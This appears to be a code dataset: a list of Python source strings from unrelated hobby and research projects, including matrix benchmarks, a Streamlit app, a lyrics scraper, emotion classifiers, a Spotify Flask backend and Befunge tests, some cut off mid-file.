    "import numpy as np\nfrom threading import Thread\nimport os\nimport psutil  # Optional for CPU usage monitoring\nimport matplotlib.pyplot as plt  # Optional for plotting\nimport time\nimport csv\n\ndef multiply_matrix(random_matrices, constant_matrix, result_matrices, start_row, end_row):\n    \"\"\"\n    Multiplies a list of random matrices with a constant matrix (row-wise) within a specified row range.\n\n    Args:\n        random_matrices (list): List of random matrices to multiply (1k x 1k).\n        constant_matrix (np.ndarray): The constant matrix (1k x 1k).\n        result_matrices (list): List of result matrices to store the products (1k x 1k).\n        start_row (int): Starting row index for multiplication.\n        end_row (int): Ending row index (exclusive) for multiplication.\n    \"\"\"\n    for i in range(start_row, end_row):\n        result_matrices[i] = np.dot(random_matrices[i], constant_matrix)\n\ndef generate_random_matrices(n, num_matrices):\n    \"\"\"\n    Generates a list of `num_matrices` random matrices of size `n` x `n`.\n\n    Args:\n        n (int): Size of each random matrix (1k in your case).\n        num_matrices (int): Number of random matrices to generate (100 in your case).\n\n    Returns:\n        list: A list containing the generated random matrices.\n    \"\"\"\n    random_matrices = []\n    for _ in range(num_matrices):\n        matrix = np.random.rand(n, n)\n        random_matrices.append(matrix)\n    return random_matrices\n\ndef get_cpu_usage():\n    \"\"\"\n    Gets the current CPU usage as a percentage.\n    \"\"\"\n    return psutil.cpu_percent(interval=1)\n\ndef main():\n    n = 2500  # Size of matrices (1k)\n    num_matrices = 100\n    constant_matrix = np.identity(n)  # Use identity matrix of size n\n\n    # Generate random matrices\n    random_matrices = generate_random_matrices(n, num_matrices)\n\n    # Create a result matrix to store the products\n    result_matrices = [np.zeros((n, n)) for _ in range(num_matrices)]\n\n    execution_times = []\n    num_threads_list = []\n\n    # Get the number of CPU cores\n    num_cores = os.cpu_count() or 1\n    print(f\"Number of CPU cores: {num_cores}\")\n\n    for num_threads in range(1, 9):\n        start_time = time.time()\n\n        threads = []\n        # Divide the workload into equal chunks for each thread\n        chunk_size = int(np.ceil(num_matrices / num_threads))\n        start_row = 0\n        for thread_id in range(num_threads):\n            end_row = min(start_row + chunk_size, num_matrices)\n            thread = Thread(target=multiply_matrix, args=(\n                random_matrices, constant_matrix, result_matrices, start_row, end_row))\n            thread.start()\n            threads.append(thread)\n            start_row = end_row\n\n        # Wait for all threads to finish\n        for thread in threads:\n            thread.join()\n\n        end_time = time.time()\n        execution_time = end_time - start_time\n        execution_times.append(execution_time)\n        num_threads_list.append(num_threads)\n\n        print(f\"Execution time with {num_threads} threads: {execution_time:.2f} seconds\")\n\n        # Optional: Get and print CPU usage during execution\n        cpu_usage = get_cpu_usage()\n        print(f\"Average CPU Usage during execution with {num_threads} threads: {cpu_usage:.2f}%\")\n\n        # Optional: Monitor memory usage during execution\n        process = psutil.Process(os.getpid())\n        memory_usage = process.memory_info().rss / (1024 ** 2)  # Memory usage in MB\n        print(f\"Memory usage during execution with {num_threads} threads: {memory_usage:.2f} MB\")\n\n    # Plot execution time against the number of threads\n    plt.figure(figsize=(10, 5))\n    plt.subplot(1, 2, 1)\n    plt.plot(num_threads_list, execution_times, marker='o')\n    plt.xlabel(\"Number of Threads\")\n    plt.ylabel(\"Execution Time (seconds)\")\n    plt.title(\"Execution Time vs. Number of Threads\")\n    plt.grid(True)\n\n    # Print or process the resulting matrices in result_matrices\n    # ...\n\n    # Plot average values of result matrices\n    plt.subplot(1, 2, 2)\n    average_values = [np.mean(matrix) for matrix in result_matrices]\n    plt.plot(range(1, num_matrices + 1), average_values)\n    plt.xlabel(\"Matrix Number\")\n    plt.ylabel(\"Average Value\")\n    plt.title(\"Average Values of Result Matrices\")\n    plt.grid(True)\n\n    plt.tight_layout()\n    plt.show()\n\n    # Write the execution time data to a CSV file\n    with open('execution_times.csv', 'w', newline='') as csvfile:\n        fieldnames = ['Number of Threads', 'Execution Time (seconds)']\n        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n        writer.writeheader()\n        for num_threads, execution_time in zip(num_threads_list, execution_times):\n            writer.writerow({'Number of Threads': num_threads, 'Execution Time (seconds)': execution_time})\n\nif __name__ == \"__main__\":\n    main()  # Call the main function here\n",
    "import random\n\nimport markdown as md\nimport streamlit as st\nfrom streamlit.components.v1 import html\n\nst.set_page_config(page_title='Markdown\u6587\u7ae0\u7f16\u8f91\u548c\u56fe\u7247\u751f\u6210\u5668,\u5c0f\u7ea2\u4e66,\u5fae\u4fe1\u516c\u4f17\u53f7,\u6296\u97f3,\u5feb\u624b,\u5fae\u535a', layout='wide', page_icon='\ud83c\udf05')\n\nurls = [\n    'https://markdown2image.streamlit.app',\n    'https://markdown2image1.streamlit.app',\n    'https://markdown2image2.streamlit.app',\n    'https://markdown2image3.streamlit.app',\n]\nrandom.shuffle(urls)\n\nst.info(f'\u5982\u679c\u670d\u52a1\u54cd\u5e94\u7f13\u6162\uff0c\u53ef\u5c1d\u8bd5\u4f7f\u7528\u5907\u4efd\u670d\u52a1\uff1a{urls[0]} \u6216 {urls[1]}', icon='\ud83d\udd17')\n\nhtml_begin = '''\n<!DOCTYPE html>\n<html lang=\"en\" class=\"__variable_20951f __variable_bbf4d0 light\" style=\"color-scheme: light;\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>HTML Document with Math Formulas</title>\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n<link href=\"https://fonts.googleapis.com/css2?family=Roboto+Mono:ital,wght@0,100..700;1,100..700&display=swap\" rel=\"stylesheet\">\n<script src=\"https://polyfill.io/v3/polyfill.min.js?features=es6\"></script>\n<script src=\"https://cdn.jsdelivr.net/npm/dom-to-image@2.6.0/dist/dom-to-image.min.js\"></script>\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/dom-to-image@2.6.0/bower_components/fontawesome/css/font-awesome.min.css\">\n<script id=\"MathJax-script\" async src=\"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js\"></script>\n<!-- Include JSZip library -->\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jszip/3.6.0/jszip.min.js\"></script>\n<!-- Include FileSaver.js library -->\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.0/FileSaver.min.js\"></script>\n<script>\nwindow.MathJax = {\n  options: {\n    ignoreHtmlClass: 'tex2jax_ignore',\n    processHtmlClass: 'tex2jax_process',\n    renderActions: {\n      find: [10, function (doc) {\n        for (const node of document.querySelectorAll('script[type^=\"math/tex\"]')) {\n          const display = !!node.type.match(/; *mode=display/);\n          const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);\n          const text = document.createTextNode('');\n          const sibling = node.previousElementSibling;\n          node.parentNode.replaceChild(text, node);\n          math.start = {node: text, delim: '', n: 0};\n          math.end = {node: text, delim: '', n: 0};\n          doc.math.push(math);\n          if (sibling && sibling.matches('.MathJax_Preview')) {\n            sibling.parentNode.removeChild(sibling);\n          }\n        }\n      }, '']\n    }\n  }\n};\n</script>\n<link rel=\"preload\" as=\"font\" href=\"/app/static/2aaf0723e720e8b9-s.p.woff2\" crossorigin=\"\" type=\"font/woff2\">\n<link rel=\"preload\" as=\"font\" href=\"/app/static/8e992d4bd80b0720-s.p.woff2\" crossorigin=\"\" type=\"font/woff2\">\n<style>\n.radix-themes[data-is-root-theme=true] {\n  position: relative;\n  z-index: 0\n}\n\n.rt-reset-a {\n  text-decoration: none;\n  color: inherit;\n  outline: none\n}\n\n.rt-reset-button {\n  -webkit-appearance: none;\n  -moz-appearance: none;\n  appearance: none;\n  background-color: transparent;\n  border: none;\n  font-size: inherit;\n  font-family: inherit;\n  line-height: inherit;\n  letter-spacing: inherit;\n  outline: none;\n  color: inherit;\n  padding: 0;\n  margin: 0;\n  text-align: initial;\n  -webkit-tap-highlight-color: transparent\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 300;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Semilight\"), local(\"Segoe UI\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 300;\n  font-style: italic;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Semilight Italic\"), local(\"Segoe UI Italic\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 400;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 400;\n  font-style: italic;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Italic\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 500;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Semibold\"), local(\"Segoe UI\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 500;\n  font-style: italic;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Semibold Italic\"), local(\"Segoe UI Italic\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 700;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Bold\")\n}\n\n@font-face {\n  font-family: \"Segoe UI (Custom)\";\n  font-weight: 700;\n  font-style: italic;\n  size-adjust: 103%;\n  descent-override: 35%;\n  ascent-override: 105%;\n  src: local(\"Segoe UI Bold Italic\")\n}\n\n@font-face {\n  font-family: \"Open Sans (Custom)\";\n  font-weight: 300;\n  desc",
    "from dataclasses import dataclass\nimport re\nimport sys\nimport time\n\nfrom bs4 import BeautifulSoup\nfrom fake_useragent import UserAgent\nimport requests\n\n\nUA = UserAgent()\n\nRETRIES = 2\nSLEEP_TIME = 0.2\n\n\n@dataclass\nclass Source:\n    html: str\n    url: str\n\n\ndef _get_first_genius_gurl(songname: str) -> str | None:\n    search_url = \"https://google.com/search?\"\n    search_params = {\"q\": \"+\".join(songname.split() + [\"lyrics\"])}\n\n    response = None\n    tries = 0\n    while response is None and tries <= RETRIES:\n        tries += 1\n        headers = {\"UserAgent\": UA.random}\n        response = requests.get(search_url, search_params, headers=headers)\n        if response.status_code != 200:\n            time.sleep(SLEEP_TIME)\n\n    if response == None or response.status_code != 200:\n        return None\n\n    search_page = BeautifulSoup(response.text, \"lxml\")\n    a_tag = search_page.find(\"a\", {\"href\": re.compile(\"https://genius.com\")})\n    return a_tag[\"href\"] if a_tag else None  # type: ignore\n\n\ndef _get_genius_page(gurl: str) -> Source | None:\n    response = None\n    tries = 0\n    while response is None and tries <= RETRIES:\n        tries += 1\n        headers = {\"UserAgent\": UA.random}\n        response = requests.get(f\"https://google.com{gurl}\", headers=headers)\n        if response.status_code != 200:\n            time.sleep(SLEEP_TIME)\n\n    if response == None or response.status_code != 200:\n        return None\n\n    source = Source(response.text.replace(\"<br/>\", \"\\n\"), response.url)\n    return source\n\n\ndef _get_title(genius_page: BeautifulSoup) -> str | None:\n    name_tag = genius_page.find(\"h1\", {\"class\": re.compile(\"SongHeader\")})\n    if name_tag:\n        name = name_tag.get_text()\n        artists_tag = name_tag.parent.a  # type: ignore\n        if artists_tag:\n            artists = artists_tag.get_text()\n            return f\"{name} - {artists}\"\n    return None\n\n\ndef _get_lyrics(genius_page: BeautifulSoup) -> str | None:\n    lyrics = \"\"\n    lyrics_containers = genius_page.find_all(\n        \"div\", {\"data-lyrics-container\": \"true\"}\n    )\n    for container in lyrics_containers:\n        lyrics += container.get_text() + \"\\n\"\n    return lyrics if lyrics else None\n\n\ndef get_formatted_answer(songname: str) -> str | None:\n    genius_url = _get_first_genius_gurl(songname)\n    if not genius_url:\n        return None\n\n    genius_page = _get_genius_page(genius_url)\n    if not genius_page:\n        return None\n\n    genius_soup = BeautifulSoup(genius_page.html, \"lxml\")\n\n    lyrics = _get_lyrics(genius_soup)\n    if not lyrics:\n        return None\n\n    title = _get_title(genius_soup)\n    title = \"? - ?\" if not title else title\n\n    return f\"{title}\\n\\n{lyrics}\\n\\nSource: {genius_page.url}\"\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        text = get_formatted_answer(\" \".join(sys.argv[1:]))\n        if text:\n            print(text)\n        else:\n            print(\"Not found\")\n    else:\n        print(\"ERROR: Pass song name as argument\\n\")\n",
    "\"\"\"\nScript calculating emotions in Harry Potter dialogues.\nIt uses bert-base-uncased-emotion Transformer from Hugging Face.\n\"\"\"\n\nimport logging\nimport pandas as pd\nimport numpy as np\nfrom transformers import pipeline\nimport os\n\nimport warnings\n\nwarnings.filterwarnings(\"ignore\")\n\n# Set working directory to current folder\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\n\n\ndef main():\n    logging.basicConfig(level=logging.INFO, format=\"%(asctime)s - %(message)s\")\n\n    transformer = transformer = pipeline(\n        \"text-classification\",\n        model=\"bhadresh-savani/bert-base-uncased-emotion\",\n        return_all_scores=True,\n    )\n    logging.info(\"Transformer loaded\")\n\n    dialogues = pd.read_csv(\n        \"../data/Harry_Potter_Movies/Dialogue.csv\", encoding=\"latin1\"\n    )\n    chapters = pd.read_csv(\n        \"../data/Harry_Potter_Movies/Chapters.csv\", encoding=\"latin1\"\n    )\n    movies = pd.read_csv(\"../data/Harry_Potter_Movies/Movies.csv\", encoding=\"latin1\")\n    movies.columns = [\n        \"Movie ID\",\n        \"Movie Title\",\n        \"Release Year\",\n        \"Runtime\",\n        \"Budget\",\n        \"Box Office\",\n    ]\n    logging.info(\"Data loaded\")\n\n    dialogue_harry_df = dialogues[dialogues[\"Character ID\"] == 1][\n        [\"Dialogue\", \"Chapter ID\"]\n    ].reset_index(drop=True)\n    dialogue_harry_df = dialogue_harry_df.merge(chapters, on=\"Chapter ID\", how=\"left\")[\n        [\"Dialogue\", \"Movie ID\", \"Chapter ID\"]\n    ]\n\n    emotions = transformer(dialogue_harry_df[\"Dialogue\"].tolist())\n    logging.info(\"Emotions calculated\")\n\n    for i, emotion in enumerate(\n        [\"sadness\", \"joy\", \"love\", \"anger\", \"fear\", \"surprise\"]\n    ):\n        dialogue_harry_df[emotion] = np.round(\n            [emotions[j][i][\"score\"] for j in range(len(emotions))], 3\n        )\n\n    dialogue_harry_df.columns = [\n        \"Dialogue\",\n        \"Movie ID\",\n        \"Chapter ID\",\n        \"Sadness\",\n        \"Joy\",\n        \"Love\",\n        \"Anger\",\n        \"Fear\",\n        \"Surprise\",\n    ]\n    dialogue_harry_df = dialogue_harry_df.drop(\n        [\"Dialogue\", \"Chapter ID\"], axis=1\n    )  # Drop unnecessary columns\n\n    emotions_by_movies = dialogue_harry_df.groupby(\"Movie ID\").mean()[\n        [\"Sadness\", \"Joy\", \"Love\", \"Anger\", \"Fear\", \"Surprise\"]\n    ]\n    emotions_by_movies = emotions_by_movies.merge(\n        movies, on=\"Movie ID\", how=\"left\"\n    ).drop([\"Movie ID\", \"Release Year\", \"Runtime\", \"Budget\", \"Box Office\"], axis=1)\n    emotions_by_movies[\"Movie Title\"] = emotions_by_movies[\"Movie Title\"].str.replace(\n        \"Harry Potter and the \", \"\"\n    )\n    logging.info(\"Emotions by movies calculated\")\n    logging.info(emotions_by_movies)\n\n    emotions_by_movies.to_csv(\n        \"../data/plots_data/harry_emotions_by_movies.csv\", index=False\n    )\n    logging.info(\"Data saved\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import os\nimport numpy as np\nfrom PIL import Image\n\nfrom torch.utils.data import Dataset\nfrom utils.transform import DefaultTransform\n\n\nclass CelebAMaskHQ(Dataset):\n    def __init__(self, images_dir, labels_dir, transform=None) -> None:\n        super().__init__()\n        self.images_dir = images_dir\n        self.labels_dir = labels_dir\n\n        if transform is None:\n            transform = DefaultTransform()\n\n        self.transform = transform\n\n        self.image_files = []\n        self.label_files = []\n        for filename in [x for x in os.listdir(self.images_dir) if os.path.splitext(x)[1] in ('.jpg', '.jpeg', '.png')]:\n            image_path = os.path.join(self.images_dir, filename)\n            label_path = os.path.join(self.labels_dir, f\"{filename[:-4]}.png\")\n\n            if os.path.isfile(image_path) and os.path.isfile(label_path):\n                self.image_files.append(image_path)\n                self.label_files.append(label_path)\n            else:\n                # continue if there is missing image or mask\n                continue\n                # raise Exception(f\"Missing file in labels or images dir: {filename[:-4]}\")\n\n    def __len__(self) -> int:\n        return len(self.image_files)\n\n    def __getitem__(self, idx: int):\n\n        image_path = self.image_files[idx]\n        label_path = self.label_files[idx]\n\n        image = Image.open(image_path)\n        # mask image size is 512x512, so original image needs to be resized from 1024x1024 to 512x512\n        image = image.resize((512, 512), Image.BILINEAR)\n\n        label = Image.open(label_path).convert('P')\n\n        image, label = self.transform(image, label)\n        label = np.array(label).astype(np.int64)\n\n        return image, label\n",
    "from dotenv import load_dotenv\nimport os\nfrom langchain_google_genai import ChatGoogleGenerativeAI\nfrom flask import Flask, jsonify, request, redirect\nfrom flask_cors import CORS\nimport spotipy\nfrom spotipy.oauth2 import SpotifyOAuth\nfrom pymongo.server_api import ServerApi\nfrom pymongo.mongo_client import MongoClient\nimport spotipy\nfrom dotenv import load_dotenv\nfrom spotipy.oauth2 import SpotifyClientCredentials\nimport json\nfrom recommend import final_recommend\nfrom mood_evaluation import mood_eval\n\nload_dotenv()\napp = Flask(__name__)\n\n# Retrieve environment variables\nclient_id = os.getenv('SPOTIFY_CLIENT_ID')\nclient_secret = os.getenv('SPOTIFY_CLIENT_SECRET')\n\n\nCORS(app, origins=['http://localhost:3000'], methods=['GET',\n     'POST'], allowed_headers=['Content-Type', 'Authorization'])\napp.config['CORS_HEADERS'] = 'Content-Type'\n\nload_dotenv()\nSPOTIFY_CLIENT_ID = os.getenv(\"SPOTIFY_CLIENT_ID\")\nSPOTIFY_CLIENT_SECRET = os.getenv(\"SPOTIFY_CLIENT_SECRET\")\nSPOTIFY_REDIRECT_URI = \"http://localhost:5000/callback\"\nSPOTIFY_SCOPES = [\"user-library-read\", \"user-top-read\", \"user-read-recently-played\",\n                  \"playlist-read-private\", \"playlist-read-collaborative\", \"user-read-private\", \"user-read-email\"]\n\nglobal_data = {\n    \"sp_oauth\": SpotifyOAuth(\n        client_id=SPOTIFY_CLIENT_ID,\n        client_secret=SPOTIFY_CLIENT_SECRET,\n        redirect_uri=SPOTIFY_REDIRECT_URI,\n        scope=SPOTIFY_SCOPES\n    ),\n    \"username\": \"\",\n    \"img\": \"\"\n}\n\n# Setup Spotify client credentials (app.py code)\nclient_credentials_manager = SpotifyClientCredentials(\n    client_id=client_id, client_secret=client_secret)\nsp = spotipy.Spotify(client_credentials_manager=client_credentials_manager)\n\nuri = os.getenv('MONGO_URI')  # Create a new client and connect to the server\nclient = MongoClient(uri, server_api=ServerApi('1'))\ndb = client['Searchify']  # Select the 'Searchify' database\ncollection = db['userData']\n\n# Send a ping to confirm a successful connection\ntry:\n    client.admin.command('ping')\n    print(\"Pinged your deployment. You successfully connected to MongoDB!\")\nexcept Exception as e:\n    print(e)\n\n\n@app.route('/login', methods=['GET'])\ndef login():\n    auth_url = global_data[\"sp_oauth\"].get_authorize_url()\n    return jsonify({\"url\": auth_url})\n\n\n@app.route('/callback', methods=['GET'])\ndef callback():\n    try:\n        code = request.args.get('code')\n        token_info = global_data[\"sp_oauth\"].get_access_token(code)\n        global_data['sp'] = spotipy.Spotify(auth=token_info['access_token'])\n        sp = global_data['sp']\n\n        # Ensure MongoDB client setup is optimal (consider moving this to global initialization)\n        MONGO_URI = os.getenv(\"MONGO_URI\")\n        client = MongoClient(MONGO_URI)\n        db = client.Searchify\n        user_data_collection = db.userData\n\n        # Fetch user's Spotify username\n        user_profile = sp.current_user()\n        username = user_profile['display_name']\n        global_data[\"username\"] = username\n\n        # Fetch and prepare user's liked songs (limit to 10)\n        liked_songs = sp.current_user_saved_tracks(limit=10)\n        liked_songs_list = [{\n            'name': track['track']['name'],\n            'artist': track['track']['artists'][0]['name'],\n            'link': track['track']['external_urls']['spotify']\n        } for track in liked_songs['items']]\n\n        # Fetch and prepare user's recently played songs (limit to 10)\n        recently_played = sp.current_user_recently_played(limit=10)\n        recently_played_list = [{\n            'name': track['track']['name'],\n            'artist': track['track']['artists'][0]['name'],\n            'link': track['track']['external_urls']['spotify']\n        } for track in recently_played['items']]\n\n        # Create a document for the user in MongoDB\n        user_data_collection.insert_one({\n            'username': username,\n            'API_recs': [],\n            'liked_songs': liked_songs_list,\n            'recently_played': recently_played_list\n        })\n\n        return jsonify({'status': 'success', 'redirectURL': 'http://localhost:3000/step2'})\n    except Exception as e:\n        print(f\"Error during callback processing: {e}\")\n        return jsonify({'error': 'Internal Server Error'}), 500\n\n\n# Define seed genres and target features for the recommendations\n@app.route('/recommendations', methods=['POST'])\ndef recommendations():\n    data = request.get_json()\n    mood = data[\"mood\"]\n    music_types = data[\"musicTypes\"]\n    special_requirements = data[\"specialRequirements\"]\n\n    # TODO: Get image from the MongoDB. Oliver Wu can do this\n    image_name = global_data['img']\n\n    username = global_data[\"username\"]\n    print(\"img\", global_data['img'])\n\n    target_features, seed_genres, environment_description = mood_eval(\n        mood, music_types, special_requirements, image_name)\n\n    # Fetch song recommendations based on the specified parameters\n    print(\"target_features\", target_features)\n    print(\"sp\", global_data[\"sp\"])\n    res = get_",
    "from io import StringIO\nfrom unittest.mock import patch\n\nfrom src.befunge_interpreter import befunge_interpreter, parse_befunge_file\nimport unittest\n\n\nclass TestBefunge(unittest.TestCase):\n\n    def test_parse_befunge_file_hello_world(self):\n        self.assertEqual(parse_befunge_file(\"../examples/hello.bf\"), [\n            ['>', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'v'],\n            ['v', ' ', ' ', ',', ',', ',', ',', ',', '\"', 'H', 'e', 'l', 'l', 'o', '\"', '<'],\n            ['>', '4', '8', '*', ',', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'v'],\n            ['v', ',', ',', ',', ',', ',', ',', '\"', 'W', 'o', 'r', 'l', 'd', '!', '\"', '<'],\n            ['>', '2', '5', '*', ',', '@']\n        ])\n\n    def test_parse_befunge_file_another_hello_world(self):\n        self.assertEqual(parse_befunge_file(\"../examples/another_hello.bf\"), [\n            [' ', '>', '2', '5', '*', '\"', '!', 'd', 'l', 'r', 'o', 'w', ' ', ',', 'o', 'l', 'l', 'e', 'H', '\"', ':',\n             'v'],\n            [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'v', ':', ',',\n             '_', '@'],\n            [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '>', ' ', ' ',\n             '^']\n        ])\n\n    def test_hello_world(self):\n        with patch(\"sys.stdout\", new=StringIO()) as stdout:\n            befunge_interpreter(parse_befunge_file(\"../examples/hello.bf\"))\n            self.assertEqual(stdout.getvalue(), \"Hello World!\\n\")\n\n    def test_another_hello_world(self):\n        with patch(\"sys.stdout\", new=StringIO()) as stdout:\n            befunge_interpreter(parse_befunge_file(\"../examples/another_hello.bf\"))\n            self.assertEqual(stdout.getvalue(), \"Hello, world!\\n\")\n\n    def test_yet_another_hello_world(self):\n        with patch(\"sys.stdout\", new=StringIO()) as stdout:\n            befunge_interpreter(parse_befunge_file(\"../examples/yet_another_hello.bf\"))\n            self.assertEqual(stdout.getvalue(), \"Hello World!\")\n",
    "# Import modules\nimport pandas as pd\nimport matplotlib.pyplot as plt\nfrom matplotlib import cm\nfrom matplotlib.colors import ListedColormap, LinearSegmentedColormap\nimport numpy as np\nimport math as mt\nimport seaborn as sns\nfrom matplotlib import rc\nimport matplotlib\nfrom scipy.signal import find_peaks\nimport os\nfrom sklearn import preprocessing\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.model_selection import GridSearchCV\nfrom sklearn.metrics import classification_report, confusion_matrix, accuracy_score\nfrom xgboost import XGBClassifier\nfrom xgboost import XGBRegressor\nfrom matplotlib import pyplot as plt\nfrom sklearn.metrics import mean_absolute_error,mean_squared_error,max_error,explained_variance_score,r2_score\nfrom sklearn.ensemble import RandomForestRegressor\nfrom sklearn.neural_network import MLPRegressor\nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.model_selection import KFold\nfrom sklearn.model_selection import cross_val_score\nimport seaborn as sns; sns.set_theme()\nimport shap\n\n\n################################## Plot parameters ##################################\n\ncolor_map = cm.get_cmap('jet', 30)\n# plt.rcParams.update({\n#     \"text.usetex\": True,\n#     \"font.family\": \"serif\",\n#     \"font.serif\": ['Computer Modern']})\n\nSMALL_SIZE = 8\nMEDIUM_SIZE = 12\nBIGGER_SIZE = 13\nplt.rc('font', size=BIGGER_SIZE)          # controls default text sizes\nplt.rc('axes', titlesize=BIGGER_SIZE)     # fontsize of the axes title\nplt.rc('axes', labelsize=BIGGER_SIZE)    # fontsize of the x and y labels\nplt.rc('xtick', labelsize=BIGGER_SIZE)    # fontsize of the tick labels\nplt.rc('ytick', labelsize=BIGGER_SIZE)    # fontsize of the tick labels\nplt.rc('legend', fontsize=MEDIUM_SIZE)    # legend fontsize\nplt.rc('figure', titlesize=BIGGER_SIZE)  # fontsize of the figure title\n\n################################## Reading csv ##################################\n\ndataset = pd.read_csv(\"../compiled_data/data_params_ujet.csv\", engine='python')\n\n# Selecting features\n# data = dataset[['Time_tilde','a0','k','sigma_s','rho_l','rho_g','mu_l','mu_g','gravity']]\n# columns = ['Time_tilde','a0','k','sigma_s','rho_l','rho_g','mu_l','mu_g','gravity']\n\ndata = dataset[['Time_tilde','epsilon','rho_r','mu_r','La_l','Bo_l']]\ncolumns = ['Time_tilde','epsilon','rho_r','mu_r','La_l','Bo_l']\n\n# Selecting labels\nlabel = dataset[['ujet_tilde']]\n\n################################## Train/test split ##################################\n\nX_train, X_test, y_train, y_test = train_test_split(data, label, random_state=0)\n\n################################## Scaling data ##################################\n\nscaler = preprocessing.MinMaxScaler()\nscaler.fit(X_train)\n\nX_train_scaled = scaler.transform(X_train)\nX_test_scaled = scaler.transform(X_test)\n\nX_train_scaled_df = pd.DataFrame(X_train_scaled)\nX_train_scaled_df.columns = X_train.columns\n\nprint(X_train_scaled_df.mean(axis=0))\nprint(X_train_scaled_df.var(axis=0))\n\n# check their shape\nprint(\"train:\", X_train_scaled_df.shape)\nprint(\"test:\", X_test_scaled.shape)\n\n################################## Cross validation/hyperparameter tunning ##################################\n\n\n\n\n################################## Predictions after tuning ##################################\n\n\n#xgb = XGBRegressor(n_estimators=grid_search.best_params_.get('n_estimators'), max_depth = grid_search.best_params_.get('max_depth'),random_state=0)\nxgb = XGBRegressor(n_estimators= 155, max_depth = 10,random_state=0)\nxgb.fit(X_train_scaled_df,y_train)\n\n\n#xgb = tune_hyperparameters(X_train_scaled, y_train)\ny_pred = xgb.predict(X_test_scaled)\ny_pred_train = xgb.predict(X_train_scaled)\n\nprint(\"Coefficient of determination, r2 = %.5f\" % r2_score(y_test, y_pred))\nprint(\"Mean Absolute Error, MAE = %.5f\" % mean_absolute_error(y_test, y_pred))\nprint(\"Mean squared error, MSE = %.5f\" % mean_squared_error(y_test, y_pred))\nprint(\"Max Error = %.5f\" % max_error(y_test, y_pred))\nprint(\"Explained Variance Score = %.5f\" % explained_variance_score(y_test, y_pred))\n\n# Feature importance\nimportance_scores = xgb.feature_importances_\nprint(importance_scores)\n\n# # Shap values\n# Create the explainer\nexplainer = shap.TreeExplainer(xgb)\nxgb_shap_values = explainer.shap_values(X_test_scaled)\n\n# ################################## Plots ##################################\n\nplt.figure(1,figsize=[8,5])\n\nax1 = plt.subplot()\nplt.setp(ax1.spines.values(), linewidth=1.3)\nfor axis in ['top', 'bottom', 'left', 'right']:\n    ax1.spines[axis].set_linewidth(1.2)  # change width\nplt.scatter(y_pred,y_test,c=X_test[\"Time_tilde\"], edgecolor='k')\nplt.plot(y_test,y_test,color = 'k',markersize=0)\n# plt.plot(y_test + 0.2*y_test,y_test,color = 'r',markersize=0)\n# plt.plot(y_test - 0.2*y_test,y_test,color = 'r',markersize=0)\n# plt.axhline(y = 1, color = 'k', linestyle = '-')\n# plt.axhline(y = -1, color = 'k', linestyle = '-')\n# ax1.legend().set_visible(False)\nplt.xlabel(r\"Prediction\")\nplt.ylabel(r\"Simulation",
    "import pandas as pd\nimport numpy as np\nfrom keras.models import Sequential\nfrom keras.layers import Conv2D, MaxPooling2D, Dense, Dropout, Flatten\nfrom keras.losses import categorical_crossentropy\nfrom keras.optimizers import Adam\nfrom keras.utils import to_categorical\n\ndef load_and_preprocess_data(file_path):\n    Catch_bat = pd.read_csv(file_path)\n    \n    X_train, Y_train, X_test, Y_test = [], [], [], []\n    \n    for index, row in Catch_bat.iterrows():\n        val = row['pixels'].split(' ')\n        try:\n            if 'Training' in row['Usage']:\n                X_train.append(np.array(val, 'float32'))\n                Y_train.append(row['emotion'])\n            elif 'PublicTest' in row['Usage']:\n                X_test.append(np.array(val, 'float32'))\n                Y_test.append(row['emotion'])\n        except:\n            pass\n    \n    X_train = np.array(X_train, 'float32')\n    Y_train = np.array(Y_train, 'float32')\n    X_test = np.array(X_test, 'float32')\n    Y_test = np.array(Y_test, 'float32')\n    \n    # \u6570\u636e\u6807\u51c6\u5316\n    X_train = (X_train - np.mean(X_train, axis=0)) / np.std(X_train, axis=0)\n    X_test = (X_test - np.mean(X_test, axis=0)) / np.std(X_test, 